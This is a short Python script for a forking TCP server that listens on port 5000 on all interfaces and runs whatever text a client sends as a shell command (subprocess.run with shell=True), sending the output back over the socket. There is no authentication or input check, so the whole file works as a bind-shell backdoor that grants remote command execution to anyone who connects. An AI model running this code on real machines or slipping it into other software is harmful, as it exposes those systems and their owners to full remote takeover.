import socket
import os
import subprocess

def main():
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 5000))  
    server_socket.listen(5)  

    print("Server is listening on port 5000...")

    while True:
        
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr} has been established.")

        
        pid = os.fork()
        if pid == 0:  
            server_socket.close() 

            
            command = client_socket.recv(1024).decode('utf-8').strip()
            print(f"Executing command: {command}")

            
            os.dup2(client_socket.fileno(), 1) 
            os.dup2(client_socket.fileno(), 2)  

            
            try:
                subprocess.run(command, shell=True)
            except Exception as e:
                print(f"Error executing command: {e}")

            client_socket.close()  
            os._exit(0) 

        else:  
            client_socket.close()  

if __name__ == "__main__":
    main()